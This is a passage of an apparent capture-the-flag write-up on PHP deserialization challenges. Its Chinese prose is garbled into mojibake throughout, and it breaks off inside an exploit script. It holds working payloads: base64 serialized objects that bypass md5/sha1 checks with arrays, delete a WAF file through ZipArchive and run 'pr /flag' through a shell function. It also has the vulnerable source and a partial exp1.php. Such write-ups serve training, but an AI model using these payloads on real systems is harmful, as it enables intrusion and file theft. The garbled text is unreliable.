é™¤waf.txtï¼š.&#x2F;?a[]&#x3D;1&amp;b[]&#x3D;aPOST:unser&#x3D;Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7Tzo1OiJsb2dpbiI6Mzp7czo0OiJmaWxlIjtOO3M6ODoiZmlsZW5hbWUiO047czo3OiJjb250ZW50IjtOO31zOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo5O30&#x3D;---è¯»å–flagï¼š.&#x2F;?a[]&#x3D;1&amp;b[]&#x3D;aPOST:unser&#x3D;Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7Tzo1OiJsb2dpbiI6Mzp7czo0OiJmaWxlIjtOO3M6ODoiZmlsZW5hbWUiO047czo3OiJjb250ZW50IjtOO31zOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6Nzoid2FmLnR4dCI7czo3OiJjb250ZW50IjtzOjg6InByIC9mbGFnIjt9æ˜¯ä¸æ˜¯å¾ˆç®€å•ï¼Ÿ</code></pre><p>å¾ˆæ–‡è‰ºçš„åå­—ï¼Œæˆ‘ä¿¡äº†å®ƒã€Šç®€å•çš„PHPååºåˆ—åŒ–ã€‹</p><h4 id="æ€è·¯ï¼š-1"><a href="#æ€è·¯ï¼š-1" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h4><p>æºç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'shell.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Game</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span>  <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$choice</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$register</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$content</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token double-quoted-string string">"21232f297a57a5a743894a0e4a801fc3"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">login</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token operator">=</span><span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'login success you can to open shell file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">register</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'success register admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'please register admin '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Open</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'unser'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>åˆ†æä¸‹ï¼Œé¦–å…ˆè¦ç»•<code>$_GET[&#39;a&#39;]!==$_GET[&#39;b&#39;]&amp;&amp;(md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;])) &amp;&amp; (sha1($_GET[&#39;a&#39;])=== sha1($_GET[&#39;b&#39;]))</code>ï¼Œç›´æ¥æ•°ç»„ç»•è¿‡ï¼Œä¼ å…¥<code>./?a[]=1&amp;b[]=a</code>å³å¯ï¼Œå¦‚ä¸‹</p><img src="/article/Nepctf2021/image-20210322152923642.png" class="" title="shuzu" loading="lazy"><h5 id="è¯»å–shell-phpï¼š"><a href="#è¯»å–shell-phpï¼š" class="headerlink" title="è¯»å–shell.phpï¼š"></a>è¯»å–shell.phpï¼š</h5><p>çœ‹Gameç±»</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Game</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span>  <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$choice</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$register</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$content</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token double-quoted-string string">"21232f297a57a5a743894a0e4a801fc3"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>çœ‹åˆ°<code>__wakeup</code>ç¬¬ä¸€ååº”å¯ä¸å¯ä»¥ç›´æ¥ç»•ï¼Œçœ‹äº†ä¸‹ç‰ˆæœ¬<code>PHP/7.0.33</code></p><blockquote><p>CVE-2016-7124ååºåˆ—åŒ–ç»•è¿‡wakeupæ¼æ´ã€‚<br>å½±å“ç‰ˆæœ¬ï¼šPHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10</p></blockquote><p>ä¹–ä¹–èµ°<code>__wakeup</code>ï¼Œregisterç±»æ²¡æœ‰ä½œç”¨ï¼Œçœ‹æ¥å¾—èµ°loginç±»</p><p>å‚æ•°<code>register</code>çš„md5è¦ä¸º<code>21232f297a57a5a743894a0e4a801fc3</code>ï¼Œä¸€æŸ¥ï¼Œ<code>admin</code></p><p>é‚£å°±æ²¡é—®é¢˜äº†ï¼Œ<code>__wakeup</code>å°†Gameç±»çš„<code>file</code>/<code>filename</code>/<code>content</code>ä¼ å…¥loginï¼Œåˆ©ç”¨loginçš„<code>__construct</code>èµ‹å€¼</p><p>Gameç±»çš„å˜é‡choiceå³loginç±»ï¼Œåˆ©ç”¨Gameç±»<code>__destruct</code>è§¦å‘loginç±»çš„checkingå‡½æ•°</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">login</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token operator">=</span><span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'login success you can to open shell file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>loginç±»çš„checkingå‡½æ•°æ£€æŸ¥èµ‹å€¼çš„usernameå’Œpasswordï¼Œå³Gameç±»ä¼ è¿‡æ¥çš„usernameå’Œpasswordã€‚ç„¶åè°ƒç”¨fileå³Gameç±»çš„fileçš„openå‡½æ•°ã€‚ç”±äºæ²¡æœ‰<code>__call</code>ä¹‹ç±»çš„é­”æœ¯æ–¹æ³•ï¼Œä¸éœ€è¦è€ƒè™‘å…¶ä»–ã€‚å³æœ¬é¢˜æ‰€æœ‰å˜é‡éƒ½å¯åœ¨Gameç±»ç›´æ¥èµ‹å€¼ã€‚</p><p>å…³é”®ç‚¹å°±åœ¨äºOpenç±»äº†</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Open</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><img src="/article/Nepctf2021/image-20210322160046909.png" class="" title="test" loading="lazy"><p>å¦‚å›¾æ‰€ç¤ºï¼Œå­˜åœ¨waf.txtï¼Œ<code>file_get_contents</code>ä¸ºtrueï¼Œå³å­˜åœ¨waf.txtæ—¶ä¼š<code>file_get_contents($filename.&quot;.php&quot;);</code>ï¼Œå¦åˆ™ä¼š<code>shell($content);</code>æ‰€ä»¥æˆ‘ä»¬é¦–å…ˆè¦åˆ©ç”¨ä¼ªåè®®è¯»å–<code>shell.php</code>çš„å†…å®¹ã€‚</p><p>exp1.phpå¦‚ä¸‹</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Game</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span>  <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$choice</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$register</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token comment">//    public function __construct()</span><span class="token comment">//    &#123;</span><span class="token comment">//        $this->username='user';</span><span class="token comment">//        $this->password='user';</span><span class="token comment">//    &#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token double-quoted-string string">"21232f297a57a5a743894a0e4a801fc3"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">login</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token operator">=</span><span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'login success you can to open shell file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">register</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'success register admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'please register admin '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Open</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span 